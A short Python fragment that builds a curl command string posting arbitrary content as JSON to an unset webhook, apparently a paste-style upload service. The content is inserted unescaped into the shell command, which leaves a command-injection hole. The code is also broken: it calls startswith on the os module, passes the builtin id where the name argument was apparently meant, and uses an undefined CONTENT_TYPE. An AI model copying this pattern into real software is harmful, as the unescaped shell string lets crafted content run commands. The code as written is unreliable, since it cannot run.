

webhook = ""

OS = "win"

def generate_command_from_content(name:str, content: str):
  t = time.ctime()
  if OS.startswith("win") or os.startswith("linux"):
    return "curl " + webhook + " -H 'content-type: "+ CONTENT_TYPE + "' --data-raw '{\"custom_url\":\"" + id + "\",\"edit_password\":\"\",\"group_name\":\"\",\"content\":\"" + content + "\"}'"
